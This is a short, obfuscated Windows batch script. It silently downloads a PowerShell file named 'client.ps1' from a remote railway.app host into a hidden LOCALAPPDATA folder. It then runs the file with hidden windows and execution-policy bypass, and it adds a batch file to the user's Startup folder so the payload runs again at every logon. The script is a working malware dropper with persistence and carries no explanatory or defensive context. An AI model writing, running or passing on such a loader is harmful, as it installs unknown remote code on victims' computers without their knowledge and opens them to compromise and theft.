@echo off
REM Ver220
setlocal EnableDelayedExpansion
REM Ver211
REM Mod611

REM [bc50738ca1ed37db98c9cca7420d32a3]

set "17cfd46e=%LOCALAPPDATA%\8a28ca1def"
set "918bb95b=https://web-production-9d7cc.up.railway.app/client.ps1"
set "1c9d56e1=%17cfd46e%\b573de1fc7.ps1"

REM Proc361
if not exist "%17cfd46e%" mkdir "%17cfd46e%"

REM Sys453
powershell -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%918bb95b%','%1c9d56e1%')"

REM Core851
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup%\7a3bd3.bat" (
    echo @echo off> "%startup%\7a3bd3.bat"
    echo powershell -w hidden -ep bypass -f "%1c9d56e1%">> "%startup%\7a3bd3.bat"
)

REM Core796
start "" /min powershell -w hidden -ep bypass -f "%1c9d56e1%"
exit /b 0

REM [22C856BD0E495DE826AC94E8]
